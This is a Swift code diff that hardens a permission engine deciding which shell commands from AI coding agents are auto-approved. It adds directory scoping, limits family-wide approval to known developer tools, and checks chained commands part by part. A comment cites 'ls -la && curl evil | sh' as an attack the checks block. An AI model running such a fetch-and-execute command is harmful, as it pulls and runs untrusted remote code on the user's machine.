@@ -41,8 +41,8 @@ final class RulesEngine {
     // In-memory deduplication: prevent identical command popups within 15 seconds
     private var recentApprovals: [String: Date] = [:]
 
-    private func isRecentlyApproved(command: String) -> Bool {
-        let cmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
+    private func isRecentlyApproved(command: String, directory: String) -> Bool {
+        let cmd = directory + "\u{0}" + command.trimmingCharacters(in: .whitespacesAndNewlines)
         if let timestamp = recentApprovals[cmd] {
             if Date().timeIntervalSince(timestamp) < 15.0 {
                 return true
@@ -53,8 +53,8 @@ final class RulesEngine {
         return false
     }
 
-    private func recordRecentApproval(command: String) {
-        let cmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
+    private func recordRecentApproval(command: String, directory: String) {
+        let cmd = directory + "\u{0}" + command.trimmingCharacters(in: .whitespacesAndNewlines)
         recentApprovals[cmd] = Date()
     }
 
@@ -64,6 +64,104 @@ final class RulesEngine {
             return true
         }
         return false
+    }
+
+    /// Developer tools whose whole family may be approved at once ("allow git in this project").
+    /// Any other command is only ever approved as that exact command.
+    static let knownToolFamilies: Set<String> = [
+            "git", "npm", "npx", "yarn", "pnpm", "bun",
+            "cargo", "rustc", "swift", "xcodebuild",
+            "python", "python3", "pytest", "pip", "pip3", "poetry", "uv",
+            "docker", "docker-compose", "podman",
+            "brew", "curl", "wget", "gh", "terraform", "go", "make", "cmake", "ctest",
+            "node", "deno", "ts-node", "tsc", "eslint", "prettier"
+    ]
+
+    /// True when `path` is `base` or inside it (path-component aware; "*" means anywhere).
+    static func isWithin(_ path: String, base: String) -> Bool {
+        if base == "*" { return true }
+        let p = ((path as NSString).expandingTildeInPath as NSString).standardizingPath
+        let b = ((base as NSString).expandingTildeInPath as NSString).standardizingPath
+        if b == "/" { return true }
+        return p == b || p.hasPrefix(b.hasSuffix("/") ? b : b + "/")
+    }
+
+    /// Shared scope check for 10-minute grants and saved rules.
+    private func matchesScope(pattern: String, family scopeFamily: String?, directory: String,
+                              command: String, family: String, isFileMod: Bool,
+                              requestDir: String, risk: Risk) -> Bool {
+        // Scope never reaches outside the folder it was granted in.
+        guard RulesEngine.isWithin(requestDir, base: directory) else { return false }
+
+        let cleanCmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
+        // The exact command the user approved always matches.
+        if cleanCmd == pattern { return true }
+
+        // Everything broader is refused for high-risk requests.
+        guard risk != .high else { return false }
+
+        // Chained commands ("cd src && npm test", "git log | head") match only if every part is
+        // covered on its own: each real command by this scope, plus harmless glue (cd into a
+        // sub-folder, read-only filters). Substitution/redirection is never auto-approved, so an
+        // approved prefix cannot smuggle in more ("ls -la && curl evil | sh").
+        if RulesEngine.isCompoundShell(cleanCmd) {
+            guard let segments = RulesEngine.chainSegments(cleanCmd) else { return false }
+            let real = segments.filter { !RulesEngine.isHarmlessSegment($0) }
+            return !real.isEmpty && real.allSatisfy { seg in
+                matchesScope(pattern: pattern, family: scopeFamily, directory: directory,
+                             command: seg, family: toolFamily(for: seg), isFileMod: false,
+                             requestDir: requestDir, risk: risk)
+            }
+        }
+
+        let isFamilyScope = scopeFamily != nil || pattern == "file_mod" || pattern == "workspace"
+            || RulesEngine.knownToolFamilies.contains(pattern)
+        if !isFamilyScope && cleanCmd.hasPrefix(pattern + " ") {
+            return true   // same command with extra arguments
+        }
+
+        // Whole-family approval only for known dev tools.
+        if RulesEngine.knownToolFamilies.contains(family), scopeFamily == family || pattern == family {
+            return true
+        }
+
+        if isFileMod && (pattern == "file_mod" || scopeFamily == "file_mod" || pattern == "Edit" || pattern == "Write") {
+            return true
+        }
+        return pattern == "workspace" || scopeFamily == "workspace"
+    }
+
+    /// Shell control operators that chain or redirect commands.
+    static func isCompoundShell(_ command: String) -> Bool {
+        let ops = ["&&", "||", ";", "|", "`", "$(", ">", "<", "\n", "&"]
+        return ops.contains { command.contains($0) }
+    }
+
+    /// Splits `a && b || c ; d | e` into its commands, or nil when it uses anything that is never
+    /// auto-approved: substitution, backticks, redirection, newlines or background `&`.
+    static func chainSegments(_ command: String) -> [String]? {
+        for banned in ["`", "$(", ">", "<", "\n"] where command.contains(banned) { return nil }
+        let withoutAnd = command.replacingOccurrences(of: "&&", with: "")
+        if withoutAnd.contains("&") { return nil }
+        var parts = [command]
+        for sep in ["&&", "||", ";", "|"] {
+            parts = parts.flatMap { $0.components(separatedBy: sep) }
+        }
+        let segments = parts.map { $0.trimmingCharacters(in: .whitespaces) }
+        return segments.contains(where: \.isEmpty) ? nil : segments
+    }
+
+    /// Glue that cannot do harm on its own: `cd` into a sub-folder, or a read-only text filter.
+    static func isHarmlessSegment(_ segment: String) -> Bool {
+        let words = segment.split(separator: " ").map(String.init)
+        guard let first = words.first else { return false }
+        if first == "cd" {
+            guard words.count == 2 else { return false }
+            let target = words[1]
+            return !target.hasPrefix("/") && !target.hasPrefix("~") && !target.hasPrefix("$")
+                && !target.hasPrefix("-") && !target.split(separator: "/").contains("..")
+        }
+        return ["head", "tail", "grep", "wc", "cut", "tr", "jq", "nl", "column", "pwd", "echo", "true"].contains(first)
     }
 
     func toolFamily(for command: String) -> String {
@@ -91,16 +189,7 @@ final class RulesEngine {
             return "file_mod"
         }
 
-        let knownTools = [
-            "git", "npm", "npx", "yarn", "pnpm", "bun",
-            "cargo", "rustc", "swift", "xcodebuild",
-            "python", "python3", "pytest", "pip", "pip3", "poetry", "uv",
-            "docker", "docker-compose", "podman",
-            "brew", "curl", "wget", "gh", "terraform", "go", "make", "cmake", "ctest",
-            "node", "deno", "ts-node", "tsc", "eslint", "prettier"
-        ]
-
-        if knownTools.contains(effectiveFirst) {
+        if RulesEngine.knownToolFamilies.contains(effectiveFirst) {
             return effectiveFirst
         }
 
@@ -114,66 +203,14 @@ final class RulesEngine {
                lower.contains("replace_file_content") || lower.contains("write_to_file")
     }
 
-    private func matchesGrant(grant: ActiveGrant, command: String, family: String, isFileMod: Bool, requestDir: String) -> Bool {
-        let cleanCmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
-
-        // 1. Direct or prefix command match
-        if cleanCmd == grant.commandPrefix || cleanCmd.hasPrefix(grant.commandPrefix) {
-            return true
-        }
-
-        // 2. Tool family match (e.g. grant for "git" allows "git status", "git diff", "git commit")
-        if let gFamily = grant.toolFamily, !gFamily.isEmpty, gFamily == family {
-            return true
-        }
-        if grant.commandPrefix == family {
-            return true
-        }
-
-        // 3. File modifications across agents (Antigravity "Write", Claude Code "Edit", Codex "Edit")
-        if isFileMod && (grant.commandPrefix == "file_mod" || grant.toolFamily == "file_mod" || grant.commandPrefix == "Edit" || grant.commandPrefix == "Write") {
-            let reqExp = (requestDir as NSString).expandingTildeInPath
-            let grantExp = (grant.directory as NSString).expandingTildeInPath
-            if grant.directory == "*" || reqExp.hasPrefix(grantExp) || grantExp.hasPrefix(reqExp) {
-                return true
-            }
-        }
-
-        // 4. Workspace match
-        if grant.commandPrefix == "workspace" || grant.toolFamily == "workspace" {
-            let reqExp = (requestDir as NSString).expandingTildeInPath
-            let grantExp = (grant.directory as NSString).expandingTildeInPath
-            if grant.directory == "*" || reqExp.hasPrefix(grantExp) || grantExp.hasPrefix(reqExp) {
-                return true
-            }
-        }
-
-        return false
+    private func matchesGrant(grant: ActiveGrant, command: String, family: String, isFileMod: Bool, requestDir: String, risk: Risk) -> Bool {
+        matchesScope(pattern: grant.commandPrefix, family: grant.toolFamily, directory: grant.directory,
+                     command: command, family: family, isFileMod: isFileMod, requestDir: requestDir, risk: risk)
     }
 
-    private func matchesRule(rule: StoredRule, command: String, family: String, isFileMod: Bool, requestDir: String) -> Bool {
-        let cleanCmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
-
-        if cleanCmd == rule.pattern || cleanCmd.hasPrefix(rule.pattern) {
-            return true
-        }
-
-        if let rFamily = rule.toolFamily, !rFamily.isEmpty, rFamily == family {
-            return true
-        }
-        if rule.pattern == family {
-            return true
-        }
-
-        if isFileMod && (rule.pattern == "file_mod" || rule.toolFamily == "file_mod" || rule.pattern == "Edit" || rule.pattern == "Write") {
-            let reqExp = (requestDir as NSString).expandingTildeInPath
-            let ruleExp = (rule.directory as NSString).expandingTildeInPath
-            if rule.directory == "*" || reqExp.hasPrefix(ruleExp) || ruleExp.hasPrefix(reqExp) {
-                return true
-            }
-        }
-
-        return false
+    private func matchesRule(rule: StoredRule, command: String, family: String, isFileMod: Bool, requestDir: String, risk: Risk) -> Bool {
+        matchesScope(pattern: rule.pattern, family: rule.toolFamily, directory: rule.directory,
+                     command: command, family: family, isFileMod: isFileMod, requestDir: requestDir, risk: risk)
     }
 
     func evaluate(request: PermissionRequest) -> Decision? {
@@ -182,7 +219,7 @@ final class RulesEngine {
         let cmd = request.plainCommand.trimmingCharacters(in: .whitespacesAndNewlines)
 
         // 0. Deduplicate: if this exact command was approved in the last 15 seconds, auto-allow immediately
-        if isRecentlyApproved(command: cmd) {
+        if isRecentlyApproved(command: cmd, directory: request.directory) {
             recordDecision(request: request, decision: .allow(.once), autoAllowed: true)
             return .allow(.once)
         }
@@ -198,7 +235,7 @@ final class RulesEngine {
         // 1. Check active temporary grants (10 min)
         if activeGrants.contains(where: { grant in
             guard !grant.isExpired else { return false }
-            return matchesGrant(grant: grant, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory)
+            return matchesGrant(grant: grant, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory, risk: request.risk)
         }) {
             recordDecision(request: request, decision: .allow(.tenMinutes), autoAllowed: true)
             return .allow(.tenMinutes)
@@ -206,7 +243,7 @@ final class RulesEngine {
 
         // 2. Check persistent rules
         if storedRules.contains(where: { rule in
-            return matchesRule(rule: rule, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory)
+            return matchesRule(rule: rule, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory, risk: request.risk)
         }) {
             recordDecision(request: request, decision: .allow(.always), autoAllowed: true)
             return .allow(.always)
@@ -221,7 +258,7 @@ final class RulesEngine {
 
     func recordDecision(request: PermissionRequest, decision: Decision, autoAllowed: Bool = false) {
         if decision.isAllowed {
-            recordRecentApproval(command: request.plainCommand)
+            recordRecentApproval(command: request.plainCommand, directory: request.directory)
         }
 
         let prev = auditLogs.first?.entryHash ?? RulesEngine.genesisHash
@@ -243,16 +280,22 @@ final class RulesEngine {
         if !autoAllowed {
             let family = toolFamily(for: request.plainCommand)
             let isFile = isFileModification(command: request.plainCommand, category: request.category)
-            let effectivePrefix = isFile ? "file_mod" : family
+            let cleanCmd = request.plainCommand.trimmingCharacters(in: .whitespacesAndNewlines)
+            // Family-wide scope only for known dev tools; anything else is remembered exactly.
+            let isFamilyScope = isFile || RulesEngine.knownToolFamilies.contains(family)
+            let effectivePrefix = isFile ? "file_mod" : (isFamilyScope ? family : cleanCmd)
+            let scopeFamily: String? = isFamilyScope ? effectivePrefix : nil
 
             switch decision {
-            case .allow(.tenMinutes):
+            case .allow(.tenMinutes), .allow(.tenMinutesAnywhere):
+                // "10 min · all" is an explicit opt-in to cover every folder ("*"); everything else
+                // about the grant (no high risk, exact/known-family commands, chain rules) still applies.
                 let grant = ActiveGrant(
                     commandPrefix: effectivePrefix,
-                    directory: request.directory,
+                    directory: (decision == .allow(.tenMinutesAnywhere) && request.risk != .high) ? "*" : request.directory,
                     expiresAt: Date().addingTimeInterval(600),
                     agent: request.requestedBy,
-                    toolFamily: effectivePrefix
+                    toolFamily: scopeFamily
                 )
                 activeGrants.append(grant)
             case .allow(.always):
@@ -261,7 +304,7 @@ final class RulesEngine {
                     directory: request.directory,
                     createdAt: Date(),
                     notes: "Saved rule from \(request.requestedBy) for \(effectivePrefix)",
-                    toolFamily: effectivePrefix
+                    toolFamily: scopeFamily
                 )
                 storedRules.append(rule)
             default:
@@ -301,11 +344,10 @@ final class RulesEngine {
     }
 
     func cleanupExpired() {
-        let initialCount = activeGrants.count
+        // Runs every second: only mutate (and so invalidate SwiftUI views) when a grant expired.
+        guard activeGrants.contains(where: { $0.isExpired }) else { return }
         activeGrants.removeAll { $0.isExpired }
-        if activeGrants.count != initialCount {
-            saveToDisk()
-        }
+        saveToDisk()
     }
 
     // MARK: - Cryptographic Chain Verification
